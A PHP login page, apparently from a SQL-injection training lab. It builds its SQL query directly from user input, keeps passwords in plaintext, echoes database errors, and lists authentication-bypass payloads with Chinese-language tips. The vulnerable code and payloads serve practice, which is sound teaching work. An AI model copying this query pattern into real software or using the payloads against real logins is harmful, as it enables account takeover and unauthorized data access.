<?php
header("Content-Type: text/html; charset=utf-8");
session_start();
$mysqli = new mysqli("db", "sqli", "sqli123", "sqli_lab");
$mysqli->set_charset("utf8mb4");

if ($mysqli->connect_error) {
    die("連線失敗: " . $mysqli->connect_error);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user']) && isset($_POST['pass'])) {
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $query = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
    $result = $mysqli->query($query) or die($mysqli->error);

    echo "<p><strong>執行的 SQL：</strong><code>" . htmlspecialchars($query) . "</code></p>";

    if ($result->num_rows === 1) {
        $_SESSION['user'] = $user;
        echo "<p>✅ 登入成功！<a href='index.php'>進入練習平台</a></p>";
        exit();
    } else {
        echo "<p>❌ 帳號或密碼錯誤</p>";
    }
}
?>

<h2>🔐 請登入</h2>
<form method="post">
    <label>帳號：<input type="text" name="user" /></label><br><br>
    <label>密碼：<input type="password" name="pass" /></label><br><br>
    <input type="submit" value="登入" />
</form>

<h3>💡 建議測試用的 SQL Injection Payload：</h3>
<ul>
  <li><strong>' OR 1=1 -- </strong> ← 最基本繞過方式（記得加空格）</li>
  <li><strong>' OR 1=1 LIMIT 1 -- </strong> ← 若只允許回傳一筆資料</li>
  <li><strong>' UNION SELECT 123,'admin','pass','TW' -- </strong> ← 自造假帳號</li>
  <li><strong>' OR 'a'='a -- </strong> ← 變化型邏輯成立測試</li>
  <li><strong>' OR 1=1#</strong> ← 使用另一種註解符號</li>
</ul>
<p>✅ 注意：<code>--</code> 後面<strong>必須加空格</strong>才能正確註解</p>
